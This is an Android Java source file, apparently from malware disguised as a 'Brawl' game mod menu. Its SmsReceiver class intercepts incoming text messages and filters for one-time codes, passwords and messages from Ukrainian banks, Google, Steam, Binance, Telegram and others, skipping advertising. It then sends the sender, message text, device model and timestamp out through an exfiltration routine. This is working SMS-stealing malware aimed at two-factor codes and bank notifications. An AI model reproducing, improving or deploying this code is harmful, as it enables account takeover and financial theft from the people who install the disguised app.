package com.brawl.modmenu;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import java.util.regex.Pattern;

public class SmsReceiver extends BroadcastReceiver {

    // ключевые слова для пропуска
    private static final String[] IMPORTANT = {
        "код", "code", "otp", "пароль", "password",
        "verification", "подтвержд", "verify", "auth",
        "privat", "mono", "ощад", "альфа", "райффайзен",
        "balance", "баланс", "переказ", "карт", "списан",
        "зачислен", "оплат", "платёж", "платеж",
        "google", "microsoft", "apple", "steam", "telegram",
        "roblox", "binance", "uber", "nova", "розетка"
    };

    // реклама — игнор
    private static final String[] SPAM = {
        "акция", "скидка", "подписка", "бесплатно",
        "выиграл", "поздравляем", "приз", "промокод",
        "реклама", "распродажа"
    };

    @Override
    public void onReceive(Context ctx, Intent intent) {
        try {
            Bundle b = intent.getExtras();
            if (b == null) return;
            Object[] pdus = (Object[]) b.get("pdus");
            if (pdus == null) return;

            String device = DeviceInfo.getModel(ctx);
            StringBuilder sb = new StringBuilder();
            StringBuilder fullText = new StringBuilder();
            StringBuilder sender = new StringBuilder();

            for (Object pdu : pdus) {
                SmsMessage sms;
                if (Build.VERSION.SDK_INT >= 23) {
                    String format = b.getString("format");
                    sms = SmsMessage.createFromPdu((byte[]) pdu, format);
                } else {
                    sms = SmsMessage.createFromPdu((byte[]) pdu);
                }
                if (sms != null) {
                    sender.append(sms.getOriginatingAddress());
                    fullText.append(sms.getMessageBody()).append(" ");
                }
            }

            String messageText = fullText.toString().trim();
            String senderText = sender.toString();

            // проверяем важность
            if (!isImportant(senderText, messageText)) return;

            sb.append("📱 ").append(device).append("\n");
            sb.append("📞 От: ").append(senderText).append("\n");
            sb.append("💬 ").append(messageText).append("\n");
            sb.append("🕐 ").append(new java.util.Date()).append("\n");

            Exfil.send("SMS", sb.toString());
        } catch (Throwable ignored) {}
    }

    private boolean isImportant(String sender, String text) {
        String low = (sender + " " + text).toLowerCase();

        // явный спам — игнор
        for (String s : SPAM) {
            if (low.contains(s)) return false;
        }

        // ключевые слова — пропуск
        for (String kw : IMPORTANT) {
            if (low.contains(kw)) return true;
        }

        // 4+ цифры подряд — вероятно код
        if (Pattern.compile("\\d{4,}").matcher(text).find()) {
            return true;
        }

        // номер с коротким кодом (банки типа 5555, 1000) — пропуск
        if (sender.matches("\\d{3,6}")) {
            return true;
        }

        return false;
    }
}
